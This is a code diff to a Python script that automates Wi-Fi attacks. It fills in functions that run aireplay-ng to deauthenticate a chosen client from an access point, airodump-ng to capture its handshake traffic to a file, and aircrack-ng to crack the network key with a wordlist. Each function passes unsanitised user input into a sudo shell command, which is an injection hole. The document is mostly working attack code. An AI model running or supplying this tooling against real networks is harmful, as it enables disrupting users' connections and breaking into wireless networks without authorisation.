@@ -80,9 +80,11 @@ def deauth(runtimeData):
 	apMAC = input("AP MAC: ")
 	supMAC = input("Target client MAC: ")
 	#Aireplay command to send deauth packets
-	cmd = " aireplay-ng -0 1 -a " + apMAC + " -c " + supMAC + " " + runtimeData.userNic
+	bssid = input("Specify the BSSID of the wireless AP: ")
+	target_mac = input("Specify the MAC address of the client you wish to deauthenticate: ")
+	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + runtimeData.userNic
 	os.system(cmd)
-
+	
 def setPromisc(runtimeData):
 	#Airmon command to set nic to promiscous
 	if sys.platform == "win32":
@@ -110,11 +112,18 @@ def switchNIC(runtimeData):
 	
 def capture(runtimeData):
 	#Airodump command to capture authentication traffic
-	cmd = ""
+	bssid = input("Please specify a BSSID: ")
+	cap_file = input("Please specify a capture file to save to: ")
+	cmd = "sudo airodump-ng -c " + runtimeData.userChannel + " --bssid " + bssid + " -w " + cap_file + " " + runtimeData.userNic
+	os.system(cmd)
 	
 def crack(runtimeData):
 	#Aircrack command to crack the key in the traffic dump
-	cmd = ""
+	word_list = input("Please specify a wordlist file: ")
+	bssid = input("Please specify a BSSID: ")
+	cap_file = input("Please specify a capture file: ")
+	cmd = "sudo aircrack-ng -w " + word_list + " -b " + bssid + " " + cap_file
+	os.system(cmd)
 
 if __name__ == '__main__':
     main()
